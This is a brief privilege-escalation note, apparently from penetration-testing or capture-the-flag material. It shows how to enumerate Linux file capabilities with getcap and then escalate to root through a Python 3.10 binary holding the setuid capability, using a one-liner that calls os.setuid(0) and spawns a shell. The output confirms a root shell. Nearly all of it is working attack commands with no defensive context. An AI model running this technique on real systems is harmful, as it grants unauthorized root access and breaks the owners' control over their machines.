
## Enumerating

```
getcap -r / 2>/dev/null
```

## Exploitation

Python

```
app@ubuntu:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```